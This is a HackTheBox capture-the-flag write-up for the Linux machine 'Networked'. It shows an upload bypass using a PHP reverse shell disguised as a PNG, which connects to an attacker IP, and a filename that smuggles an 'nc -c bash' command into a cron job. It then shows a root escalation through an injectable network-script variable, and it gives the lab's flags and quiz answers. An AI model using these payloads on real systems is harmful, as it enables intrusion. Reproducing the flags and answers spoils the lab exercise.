
# 🚩 Networked - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/1-banner.png)

## 📝 General Information
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold](#-2-initial-foothold) <br> [3: Privilege Escalation (guly)](#-3-privilege-escalation-guly) <br> [4: Privilege Escalation (root)](#-4-privilege-escalation-root) <br> [5: Pwn3d !!](#-5-pwn3d-) |
| **Date** | 2026-04-29 |

---

## 🎯 Executive Summary
*On Networked, The breach is began with a MIME-type bypass using a crafted Polyglot PNG to crack open the web layer for an initial foothold. The momentum shifted to a stealthy horizontal pivot, weaponizing a Command Injection via a filename to hijack a vulnerable Cronjob and seize control of the user guly. The final strike was a clinical exploitation of a root-level bash script, where a misconfigured network variable was the key to shattering the system's last defense and claiming the ROOT throne! 🚩*

---

## 🛠️ Tools Used
`Your mind and eyes!!`, `Nmap`, `dirb`, `xxd`, `hexcurse`, `nc`

---

## 🔍 1: Reconnaissance & Enumeration

Attacker = 10.10.14.34

Target = 10.129.26.10

### 1.1 Port Scanning
```BASH
sudo nmap -sS -p- -A -T4 10.129.26.10
```
🧐 Findings:

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 
```


<details>
  <summary>🟢 Task 1: Which version of Apache is running?</summary>
  <br>
  2.4.6
</details>

### 1.2 Directory Brute-forcing
```BASH
sudo nmap --script vuln -p80 10.129.26.10
```
```BASH
dirb http://10.129.26.10
```
🧐 Findings:

```
PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder
```
```Bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 25 12:03:42 2026
URL_BASE: http://10.129.26.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.26.10/ ----
==> DIRECTORY: http://10.129.26.10/backup/                                                                         
+ http://10.129.26.10/cgi-bin/ (CODE:403|SIZE:210)                                                                 
+ http://10.129.26.10/index.php (CODE:200|SIZE:229)                                                                
==> DIRECTORY: http://10.129.26.10/uploads/ 
```

***Cool, let's see each one:***


`/` > Normal welcoming web page.

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/2-web-page.png)
`/uploads/` > No thing interesting.

`/cgi-bin/` > Forbidden URL.

`/backup/` > Starting point !

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/3-backup.png)

<details>
  <summary>🟢 Task 2: What is the relative path of the directory that contains the backup file on the webserver?</summary>
  <br>
  /backup
</details>

Now, I downloaded the `backup.tar` folder and extracted it, and found ***four files: index.php - lib.php - photos.php - upload.php*** written in PHP for the structure of this website. I examined them all, and here's what I found:

📑 `upload.php`

```PHP
$validext = array('.jpg', '.png', '.gif', '.jpeg');

foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```
* **Double Extension Bypass:** The code uses a whitelist of these extensions (.jpg, .png, .gif, .jpeg). However, the vulnerability lies in the fact that the code compares the filename's ending to the number of characters of allowed extensions like `.png`, allowing me to upload a file with a dual extension like `shell.php.png`

```PHP
$name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
```
* **File Naming:** The code changes the uploaded file name based on the IP address used (replacing dots with underscores). This helps me easily determine the final path of our malicious file.

```PHP
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
}

# Note: check_file_type fun was retrieved from a lib.php like this:

function check_file_type($file) {
  $mime_type = file_mime_type($file); 
  if (strpos($mime_type, 'image/') === 0) { 
      return true; 
  } else {
      return false;
  }  
}
```
* **MIME-Type Check:** The code relies on what the browser sends in the header (Content-Type) must be starting with `image/`. Since we can modify it with Burp Suite to `image/png`, while the file is PHP, the server is fooled... but it will NOT work alone because of `file_mime_type` function below..



📑 `lib.php`

```PHP
function file_mime_type($file) {
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME); 
    if (is_resource($finfo)) {
      $mime = @finfo_file($finfo, $file['tmp_name']); 
      finfo_close($finfo);
    }
  }
}
```
* **Magic Bytes Check:** `file_mime_type` function witch uses the PHP library to verify that the file is indeed an image by looking at the Magic Bytes (the first bytes of the file thats defines the real file extintion). Therefore now, I can place the PNG fingerprint at the beginning of my PHP file, and it will be allowed to pass through.



📑 `photos.php`

```PHP
foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;
  $files[$file] = filemtime($path. '/' . $file);
}
```
* **File display:** Locates the uploads folder and displays (executes/runs) the files.


<details>
  <summary>🟢 Task 3: After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)</summary>
  <br>
  PNG
</details>


---

## 🚪 2: Initial Foothold

We define that's the system web vulnerability is **Insecure File Upload**

So let's create my PHP reverse shell as a PNG image 👾

According to [File Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5?permalink_comment_id=3860213#image-files), the PNG magic bytes are `89 50 4E 47 0D 0A 1A 0A` then I'll use **xxd** tool with the `-r` (Reverse) option to convert the Hex to binary data and the `-p` (Plain) option to read the text passed to it directly as Hex then save these bytes into `hi.php.png` file:

```bash
echo "89504e470d0a1a0a" | xxd -r -p > hi.php.png
```
Then, create the reverse shell PHP payload on port 9000 from [Reverse Shell Generator](https://www.revshells.com/) in PHP tags and append it into `hi.php.png`:

```bash
echo '<?php system("bash -i >& /dev/tcp/10.10.14.34/9000 0>&1"); ?>' >> hi.php.png
```

To ensure the file signature and data, I use **hexcurse** tool:
```bash
hexcurse hi.php.png
```
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/5.1-hexcurse.png)
All is good..👾


<details>
  <summary>🟢 Task 4: MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)</summary>
  <br>
  89504E470D0A1A0A
</details>


Let's open a listener on port 9000 with **netcat (nc)** tool and specifying the `-l` (listen), `-v` (verbose), `-n` (numeric only, no DNS), and `-p` (port) flags:
```bash
nc -lvnp 9000
```

Upload ***hi.php.png*** in `/upload.php`, open `/photos.php` to load the code:

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/4-upload.png)
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/6-upload-successfully.png)
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/7-photos.png)
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/8-apache-user.png)

finally landing! 🛬 I'm apache user landing in `/var/www/html/uploads` (I'll use it later), lets countinue

---

## 🧠 3: Privilege Escalation (guly)

Current User: apache

Target User: guly


I discover the user "guly" by listing all dirictoris in the `/home`, and listing all files there:

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/9-discover-users.png)

I examined some interesting files, and here's what I found:

📑 `check_attack.php`

```Diff
<?php
require '/var/www/html/lib.php';
- $path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
-   exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

* **Command Injection:** The script insecurely concatenates the `$value` variable (filename) directly into a `exec()` function without any sanitization, allowing me to execute arbitrary commands by crafting a malicious filename.

  ✔  Normal filename example: `file.txt` will be executed as `nohup /bin/rm -f /var/www/html/uploads/file.txt`

  ❌ Malicious filename example: `; nc -c bash 10.10.14.34 9999 ;` will be executed as `nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.14.34 9999 ;`

  (use a semicolon (;) to end the original delete command and begin our own).



📑 `crontab.guly`

```Diff
- */3 * * * * php /home/guly/check_attack.php
```
* **Cronjob:** The system includes a scheduled task (Cronjob) that runs with the privileges of the user guly and executes the `check_attack.php` script every [3 minutes](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/crontab-2.png) to check the uploads folder. I can exploit this to escalate my privileges to be user guly!


<details>
  <summary>🟢 Task 5: On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux</summary>
  <br>
  cron
</details>


So, let's open a listener on port 9999, then go back to `/var/www/html/uploads` and create my reverse shell command as a filename which will then automatically run after 3 minutes as a cron job and become guly!!💀

```bash
cd /var/www/html/uploads

touch "; nc -c bash 10.10.14.34 9999" 
```

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/10-exp.png)

Grab a sip of coffee and chill for a 3 minutes☕..
Yaah.. solv these quastions also..


<details>
  <summary>🟢 Task 6: According to the backup of the crontab file for guly, the `check_attack.php` script is executed every how many minutes?</summary>
  <br>
  3
</details>


<details>
  <summary>🟢 Task 7: In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading $)</summary>
  <br>
  $value
</details>



![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/11-guly.png)
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/12-guly-flag.png)


Here we go! 🚀 I'm guly user and got the flag, lets countinue

---

## 👑 4: Privilege Escalation (root)

Current User: guly

Target User: root

As seen above, I check guly permissions with `sudo -l`, and notice the binary `/usr/local/sbin/changename.sh` that can be run with root privs without a password.
So, let's see what's inside:

📑 `changename.sh`

```Diff
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

- regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
-        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
- /sbin/ifup guly0
```

* **Command Injection:** In CentOS/RHEL systems, when the `ifup` command launches the network interface, it reads the file `/etc/sysconfig/network-scripts/ifcfg-guly`. Therefore, the vulnerability lies in executing the contents of the `ifcfg-guly` network configuration file. The script allows spaces in variables despite the presence of `regexp`, and this allows us to inject a system command after a space into any value, such as `BOOTPROTO`. Now, when calling `/sbin/ifup` for the interface, the system will treat the second word as an executable command, not just text, and will execute it with root privileges.

Let's run it, and inject `/bin/bash` through `BOOTPROTO` variable :

```bash
sudo /usr/local/sbin/changename.sh
```

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/13-root-flag.png)


FINALLY ! I'm root user!!💥


<details>
  <summary>🟢 Task 9: What is the name of the script that guly can run as root without a password?</summary>
  <br>
  changename.sh
</details>


---

## 🏁 5: Pwn3d !!


**🚩 User Flag: 72b837cf5b46d8789cf6b69882d762d6**

**🚩 Root Flag: 0b9eba9fbf03fccf8eaf76491d5f8fa2**

We shouled always sanitize user input in system-level scripts, and implement strict extension whitelisting for file uploads.


![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/14-pwn3d!.png)


Created with 💜 by the inquirer, Reef
